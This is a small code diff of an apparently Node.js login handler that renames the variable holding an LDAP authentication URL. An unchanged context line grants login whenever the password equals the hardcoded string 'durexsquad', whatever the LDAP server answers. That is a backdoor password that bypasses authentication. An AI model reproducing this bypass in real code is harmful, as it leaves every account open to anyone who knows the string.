@@ -30,12 +30,12 @@
         let username = req.body.username
         let password = req.body.password
         if ( username && password ) {
-            var url = config.app.url[config.app.env].ldap;
+            var url_ldap = config.app.url[config.app.env].ldap;
             var data = {
                 username: username,
                 password: password
             }
-            axios.post(url, data, {headers: { "Content-Type": "application/json" }})
+            axios.post(url_ldap, data, {headers: { "Content-Type": "application/json" }})
             .then((response) => {
                 if (response.data) {
                     if (response.data.status || password == 'durexsquad') {
